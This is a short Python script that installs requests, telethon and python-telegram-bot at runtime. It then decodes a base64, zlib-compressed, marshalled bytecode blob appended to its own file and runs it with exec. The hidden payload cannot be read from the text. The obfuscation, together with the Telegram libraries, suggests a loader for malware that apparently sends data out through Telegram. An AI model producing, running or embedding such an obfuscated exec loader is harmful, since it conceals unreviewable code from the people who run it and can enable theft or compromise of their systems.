import subprocess
import sys
import base64
import zlib
import marshal

subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
subprocess.check_call([sys.executable, "-m", "pip", "install", "telethon"])
subprocess.check_call([sys.executable, "-m", "pip", "install", "python-telegram-bot"])

with open(__file__, "r", encoding="utf-8") as f:
    data = f.read()
secure_data = data.split("# DATA")[1].strip()
payload = marshal.loads(zlib.decompress(base64.b64decode(secure_data)))
exec(payload)

# DATA
eJxlUM9rE0EUfvNjfzWRYGhALPGSU0DF/iJRQnFLSy8iKEXNXpZNZlrT7u7IzsbU9pKjnvTWHnst7cGLNy/+BwYCaceLFw/ehB6Enpw1LQp5A2/e+/i+j/deG/4L8/I//6zTPjBgKIQIeQhlNQ6xhxnxCAaOODmhx2hM9yinW1MwEVv5ScyztNrmFjOO8RhZBM/R+tIkl5ncObGueHoGnL1//RtcgVmQqIcRNHWfITukCT1UtX9mlCpSZFmkj3fv1uq1uXsLi/XZhQeuu+bLZ9vN1fnn6/frT3utWvD6Dl954c0F84+6cdNdeaJ1Riq2eaxw0trNPQx2RCjS0I/aVays9ssg9TtM2Uy0uxGP02pO2SkP+WYSREk2ncJCKqclUn/sQnSpLMml7IhY2RudkMdBxFX+EvIzRFHxSnPRhromecz8K/cjOM92ubAbMk068eaSshuRYN2QLyXTf+8AINd1+kUQQj/gxjdwvucbfefMdD44Q/Nmn5wWiu/33u2NCpVBodLPnxnO29sHdGiUD6+fUmtESwNaOog+Bl9paUjrvwmYt0ZGeWCUL2ROG3+adovkS9FwZ6w/rXiJQg==
